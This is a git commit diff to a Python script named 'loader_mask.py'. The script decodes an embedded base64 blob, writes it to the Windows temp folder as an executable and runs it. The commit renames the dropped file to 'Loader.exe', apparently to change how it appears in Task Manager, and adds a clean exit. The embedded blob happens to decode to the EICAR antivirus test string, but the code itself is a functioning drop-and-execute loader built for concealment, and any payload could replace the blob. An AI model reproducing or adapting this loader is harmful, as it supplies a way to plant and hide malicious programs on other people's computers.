388d9e4dec90acf2f134b2488590896ceef8b2cb
httpshotmaker <80145620+httpshotmaker@users.noreply.github.com>
2022-08-17 17:39:00 +0300

    Fixing exit problems | Rename in Task Manager

--- loader_mask.py
+++ loader_mask.py
@@ -2,9 +2,11 @@ import os
 import subprocess as sbp
 import time
 from base64 import b64decode as b64d
+import sys
 time.sleep(1)
 temp = sbp.check_output("cmd /c echo %temp%").decode().replace("\r\n","")
 b64data = b'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='
-with open(f"{temp}\\INST.exe","wb")as f:
+with open(f"{temp}\\Loader.exe","wb")as f:
     f.write(b64d(b64data))
-os.system(f"{temp}\\INST.exe")
+os.system(f"{temp}\\Loader.exe")
+sys.exit()
